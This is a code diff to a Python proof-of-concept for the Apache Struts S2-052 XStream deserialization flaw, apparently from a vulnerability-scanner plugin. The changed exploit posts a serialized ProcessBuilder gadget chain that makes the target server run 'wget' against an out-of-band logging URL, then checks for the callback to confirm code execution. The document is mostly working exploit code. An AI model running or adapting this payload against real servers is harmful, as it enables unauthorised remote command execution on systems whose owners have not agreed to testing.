@@ -17,14 +17,16 @@ Referer
 """
 import requests
 from six.moves.urllib import parse
-
+from plugin.dnslog import Dnslog
+import logging
 
 def poc(url):
     url = url if '://' in url else 'http://' + url
     url = url.split('#')[0].split('?')[0].rstrip('/')
 
-    command = "echo rivirsirfortest"
-    # 无回显payload, 无法直接检测。
+    mydnslog = Dnslog("s2-052")
+    weburl = mydnslog.getWeburl()
+    print("weblog url: %s" % weburl)
     payload = """<map>
   <entry>
     <jdk.nashorn.internal.objects.NativeString>
@@ -41,8 +43,8 @@ def poc(url):
                     <iter class="java.util.Collections$EmptyIterator"/>
                     <next class="java.lang.ProcessBuilder">
                       <command>
-                        <string>ping</string>
-                        <string>afasdfasdfasdfasdfasd.h7x7ty.ceye.io</string>
+                        <string>wget</string>
+                        <string>{url}</string>
                       </command>
                       <redirectErrorStream>false</redirectErrorStream>
                     </next>
@@ -79,15 +81,15 @@ def poc(url):
     <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
     <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
   </entry>
-</map>"""
+</map>""".format(url=weburl)
 
     headers = {
         "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
         "Content-Type":"application/xml"
     }
     resp = requests.post(url, data=payload, headers=headers)
-    print resp.headers
-
+    if mydnslog.verifyHTTP(3):
+        return "[S2-052][weblog] " + url
 
 if __name__ == "__main__":
     poc("http://vuln.com:8080/orders.xhtml")
